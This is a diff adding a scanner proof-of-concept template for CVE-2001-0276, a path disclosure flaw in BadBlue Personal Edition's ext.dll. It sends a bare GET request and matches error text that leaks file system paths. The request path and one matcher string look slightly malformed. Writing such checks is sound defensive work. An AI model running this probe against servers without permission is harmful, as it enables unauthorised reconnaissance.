@@ -1,0 +1,29 @@
+[info]
+author = "AVE"
+description = "检测 BadBlue Personal Edition 1.02.07 Web 服务器 ext.dll 路径泄露漏洞。远程攻击者直接请求 /ext.dll 不带任何参数，服务器返回的错误消息中会泄露服务器文件系统的物理路径信息。"
+id = "POC-AVE-2001-0114"
+name = "CVE-2001-0276 PoC"
+severity = "medium"
+tags = ["ave-2001-0114"]
+vuln_id = [
+    "CVE-2001-0276",
+    "AVE-2001-0114",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/ext.dll"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    ':\',
+    "drive",
+    "path",
+]
